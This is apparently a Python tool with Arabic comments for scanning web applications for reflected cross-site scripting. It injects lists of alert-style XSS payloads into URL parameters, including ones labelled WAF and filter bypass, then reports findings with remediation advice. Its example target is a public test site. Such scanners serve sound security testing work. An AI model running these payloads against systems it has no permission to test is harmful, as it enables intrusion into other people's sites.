"""
Reflected XSS Scanner
=====================
ماسح متقدم لاكتشاف ثغرات Reflected XSS

Features:
- Context-aware detection
- WAF bypass techniques
- Multiple encoding methods
- Polyglot payloads
- Filter bypass
"""

import re
import time
import urllib.parse
from typing import List, Dict, Optional
from bs4 import BeautifulSoup
import requests
from colorama import Fore, Style


class ReflectedXSSScanner:
    """ماسح ثغرات Reflected XSS"""
    
    def __init__(self, target_url: str, config: dict = None):
        """
        Args:
            target_url: رابط الهدف
            config: إعدادات الماسح
        """
        self.target_url = target_url
        self.config = config or {}
        self.vulnerabilities = []
        self.tested_payloads = 0
        self.session = requests.Session()
        
        # تحميل Payloads
        self.payloads = self._load_payloads()
        
        # Contexts للكشف
        self.contexts = [
            'html',
            'attribute',
            'javascript',
            'style',
            'url'
        ]
    
    def _load_payloads(self) -> Dict[str, List[str]]:
        """تحميل payloads حسب السياق"""
        return {
            'basic': [
                '<script>alert(1)</script>',
                '<img src=x onerror=alert(1)>',
                '<svg/onload=alert(1)>',
                '<body onload=alert(1)>',
                '<iframe src="javascript:alert(1)">',
            ],
            'polyglot': [
                'jaVasCript:/*-/*`/*\`/*\'/*"/**/(/* */onerror=alert(1) )//',
                '--></script><svg/onload=\'+/"/+/onmouseover=1/+/[*/[]/+alert(1)//',
                '"><img src=x onerror=alert(1)//>',
            ],
            'filter_bypass': [
                '<script>al\x65rt(1)</script>',
                '<img src=x onerror=\x61lert(1)>',
                '<svg/onload=alert&#40;1&#41;>',
                '<img src=x onerror=alert`1`>',
                '<script>eval(atob("YWxlcnQoMSk="))</script>',
            ],
            'waf_bypass': [
                '<sCrIpT>alert(1)</ScRiPt>',
                '<script>aler\u0074(1)</script>',
                '<img src=x onerror="&#97;lert(1)">',
                '<svg><script>alert&#40;1&#41;</script>',
                '<img src=x onerror=\u0061lert(1)>',
            ],
            'attribute_breaking': [
                '" onload="alert(1)',
                '\' onload=\'alert(1)',
                '> <script>alert(1)</script>',
                '"></script><script>alert(1)</script>',
                '\'/><script>alert(1)</script>',
            ],
            'event_handlers': [
                '<img src=x onerror=alert(1)>',
                '<body onload=alert(1)>',
                '<input onfocus=alert(1) autofocus>',
                '<select onfocus=alert(1) autofocus>',
                '<textarea onfocus=alert(1) autofocus>',
                '<marquee onstart=alert(1)>',
                '<details open ontoggle=alert(1)>',
            ],
            'javascript_context': [
                '\';alert(1);//',
                '\";alert(1);//',
                '\'});alert(1);//',
                '\'-alert(1)-\'',
                '</script><script>alert(1)</script>',
            ],
            'advanced': [
                '<svg><animate onbegin=alert(1) attributeName=x dur=1s>',
                '<object data="javascript:alert(1)">',
                '<embed src="javascript:alert(1)">',
                '<form action="javascript:alert(1)"><input type=submit>',
                '<isindex action="javascript:alert(1)" type=submit value=click>',
            ]
        }
    
    def scan(self, parameters: Dict[str, str] = None) -> List[Dict]:
        """
        فحص الهدف بحثاً عن Reflected XSS
        
        Args:
            parameters: البارامترات المراد فحصها
            
        Returns:
            قائمة الثغرات المكتشفة
        """
        print(f"\n{Fore.CYAN}[*] Starting Reflected XSS Scan...{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[*] Target: {self.target_url}{Style.RESET_ALL}")
        
        # استخراج البارامترات إذا لم يتم توفيرها
        if not parameters:
            parameters = self._extract_parameters()
        
        if not parameters:
            print(f"{Fore.RED}[!] No parameters found to test{Style.RESET_ALL}")
            return []
        
        print(f"{Fore.GREEN}[+] Found {len(parameters)} parameters to test{Style.RESET_ALL}")
        
        # فحص كل بارامتر
        for param_name, param_value in parameters.items():
            print(f"\n{Fore.CYAN}[*] Testing parameter: {param_name}{Style.RESET_ALL}")
            self._test_parameter(param_name, param_value)
        
        # النتائج
        self._print_results()
        return self.vulnerabilities
    
    def _extract_parameters(self) -> Dict[str, str]:
        """استخراج البارامترات من الرابط"""
        parsed = urllib.parse.urlparse(self.target_url)
        params = urllib.parse.parse_qs(parsed.query)
        return {k: v[0] if v else '' for k, v in params.items()}
    
    def _test_parameter(self, param_name: str, original_value: str):
        """فحص بارامتر واحد"""
        # اختبار كل نوع من الـ payloads
        for payload_type, payloads in self.payloads.items():
            for payload in payloads:
                self.tested_payloads += 1
                
                # إنشاء الطلب
                result = self._send_payload(param_name, payload, original_value)
                
                if result and result['vulnerable']:
                    # تأكيد الثغرة
                    if self._confirm_vulnerability(param_name, payload):
                        vuln_info = {
                            'type': 'Reflected XSS',
                            'severity': 'High',
                            'parameter': param_name,
                            'payload': payload,
                            'payload_type': payload_type,
                            'context': result.get('context', 'unknown'),
                            'url': result['url'],
                            'confidence': result.get('confidence', 0),
                            'evidence': result.get('evidence', ''),
                            'recommendation': self._get_remediation(result.get('context'))
                        }
                        self.vulnerabilities.append(vuln_info)
                        
                        print(f"{Fore.RED}[!] VULNERABLE: {param_name}{Style.RESET_ALL}")
                        print(f"    Payload: {payload[:50]}...")
                        print(f"    Context: {result.get('context')}")
                        break
                
                # تأخير لتجنب Rate Limiting
                time.sleep(self.config.get('delay', 0.5))
    
    def _send_payload(self, param_name: str, payload: str, original_value: str) -> Optional[Dict]:
        """إرسال payload والتحقق من الاستجابة"""
        try:
            # بناء الرابط مع الـ payload
            parsed = urllib.parse.urlparse(self.target_url)
            params = urllib.parse.parse_qs(parsed.query)
            params[param_name] = [payload]
            
            new_query = urllib.parse.urlencode(params, doseq=True)
            test_url = urllib.parse.urlunparse((
                parsed.scheme, parsed.netloc, parsed.path,
                parsed.params, new_query, parsed.fragment
            ))
            
            # إرسال الطلب
            response = self.session.get(
                test_url,
                timeout=self.config.get('timeout', 10),
                allow_redirects=True,
                headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'}
            )
            
            # تحليل الاستجابة
            return self._analyze_response(response, payload, test_url)
            
        except Exception as e:
            print(f"{Fore.YELLOW}[!] Error testing payload: {str(e)}{Style.RESET_ALL}")
            return None
    
    def _analyze_response(self, response, payload: str, url: str) -> Dict:
        """تحليل الاستجابة للكشف عن XSS"""
        result = {
            'vulnerable': False,
            'url': url,
            'confidence': 0,
            'context': 'unknown',
            'evidence': ''
        }
        
        content = response.text.lower()
        payload_lower = payload.lower()
        
        # 1. فحص مباشر: هل الـ payload موجود في الاستجابة؟
        if payload_lower in content:
            result['vulnerable'] = True
            result['confidence'] = 60
            
            # 2. تحديد السياق (Context)
            context = self._detect_context(response.text, payload)
            result['context'] = context
            
            # 3. فحص إذا كان الـ payload قابل للتنفيذ
            if self._is_executable(response.text, payload, context):
                result['confidence'] = 95
                result['evidence'] = self._extract_evidence(response.text, payload)
            
            # 4. فحص Headers
            if self._check_security_headers(response.headers):
                result['confidence'] -= 10  # تقليل الثقة إذا كانت هناك headers حماية
        
        return result
    
    def _detect_context(self, html: str, payload: str) -> str:
        """تحديد سياق ظهور الـ payload"""
        soup = BeautifulSoup(html, 'html.parser')
        
        # البحث في النص
        if payload in html:
            # داخل tag
            if re.search(rf'<[^>]*{re.escape(payload)}[^>]*>', html):
                # داخل attribute
                if re.search(rf'(\w+)=["\']?[^"\']*{re.escape(payload)}', html):
                    return 'attribute'
                return 'html_tag'
            
            # داخل script
            if re.search(rf'<script[^>]*>.*{re.escape(payload)}.*</script>', html, re.DOTALL):
                return 'javascript'
            
            # داخل style
            if re.search(rf'<style[^>]*>.*{re.escape(payload)}.*</style>', html, re.DOTALL):
                return 'style'
            
            # في الـ HTML العادي
            return 'html'
        
        return 'unknown'
    
    def _is_executable(self, html: str, payload: str, context: str) -> bool:
        """فحص إذا كان الـ payload قابل للتنفيذ"""
        # Patterns للأكواد القابلة للتنفيذ
        executable_patterns = [
            r'<script[^>]*>.*alert.*</script>',
            r'onerror\s*=\s*["\']?alert',
            r'onload\s*=\s*["\']?alert',
            r'javascript:alert',
            r'<svg[^>]*onload',
            r'<img[^>]*onerror',
        ]
        
        for pattern in executable_patterns:
            if re.search(pattern, html, re.IGNORECASE):
                return True
        
        # فحص حسب السياق
        if context == 'javascript':
            # فحص إذا كان داخل string في JavaScript
            if re.search(rf'["\'].*{re.escape(payload)}.*["\']', html):
                return False
        
        return payload in html and '<' in payload
    
    def _check_security_headers(self, headers: Dict) -> bool:
        """فحص headers الحماية"""
        protective_headers = [
            'x-xss-protection',
            'content-security-policy',
            'x-content-type-options'
        ]
        
        for header in protective_headers:
            if header in [h.lower() for h in headers.keys()]:
                return True
        return False
    
    def _extract_evidence(self, html: str, payload: str) -> str:
        """استخراج دليل الثغرة"""
        # البحث عن السطر الذي يحتوي على الـ payload
        lines = html.split('\n')
        for i, line in enumerate(lines):
            if payload in line:
                # استخراج 100 حرف حول الـ payload
                start = max(0, line.find(payload) - 50)
                end = min(len(line), line.find(payload) + len(payload) + 50)
                return line[start:end]
        return ''
    
    def _confirm_vulnerability(self, param_name: str, payload: str) -> bool:
        """تأكيد الثغرة بـ payload مختلف"""
        # استخدام payload بسيط للتأكيد
        confirm_payload = '<script>alert(9999)</script>'
        
        try:
            parsed = urllib.parse.urlparse(self.target_url)
            params = urllib.parse.parse_qs(parsed.query)
            params[param_name] = [confirm_payload]
            
            new_query = urllib.parse.urlencode(params, doseq=True)
            test_url = urllib.parse.urlunparse((
                parsed.scheme, parsed.netloc, parsed.path,
                parsed.params, new_query, parsed.fragment
            ))
            
            response = self.session.get(test_url, timeout=5)
            
            return confirm_payload.lower() in response.text.lower()
            
        except:
            return False
    
    def _get_remediation(self, context: str) -> str:
        """الحصول على توصيات الإصلاح"""
        recommendations = {
            'html': 'استخدم HTML encoding لجميع المدخلات قبل عرضها',
            'attribute': 'استخدم attribute encoding واستخدم علامات اقتباس مزدوجة',
            'javascript': 'لا تضع مدخلات المستخدم مباشرة في JavaScript context',
            'style': 'تجنب وضع مدخلات المستخدم في CSS contexts',
            'url': 'استخدم URL encoding والتحقق من البروتوكول'
        }
        return recommendations.get(context, 'استخدم output encoding المناسب للسياق')
    
    def _print_results(self):
        """طباعة النتائج النهائية"""
        print(f"\n{Fore.CYAN}{'='*60}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}Reflected XSS Scan Results{Style.RESET_ALL}")
        print(f"{Fore.CYAN}{'='*60}{Style.RESET_ALL}")
        
        print(f"\n{Fore.YELLOW}Total Payloads Tested: {self.tested_payloads}{Style.RESET_ALL}")
        print(f"{Fore.RED}Vulnerabilities Found: {len(self.vulnerabilities)}{Style.RESET_ALL}")
        
        if self.vulnerabilities:
            print(f"\n{Fore.RED}[!] VULNERABLE PARAMETERS:{Style.RESET_ALL}")
            for vuln in self.vulnerabilities:
                print(f"\n  Parameter: {vuln['parameter']}")
                print(f"  Context: {vuln['context']}")
                print(f"  Confidence: {vuln['confidence']}%")
                print(f"  Payload: {vuln['payload'][:80]}...")
        else:
            print(f"\n{Fore.GREEN}[+] No Reflected XSS vulnerabilities found{Style.RESET_ALL}")


# مثال على الاستخدام
if __name__ == "__main__":
    # تجربة الماسح
    scanner = ReflectedXSSScanner(
        target_url="http://testphp.vulnweb.com/listproducts.php?cat=1",
        config={'delay': 0.3, 'timeout': 10}
    )
    
    results = scanner.scan()
    
    print(f"\n{Fore.GREEN}Scan completed!{Style.RESET_ALL}")
    print(f"Found {len(results)} vulnerabilities")
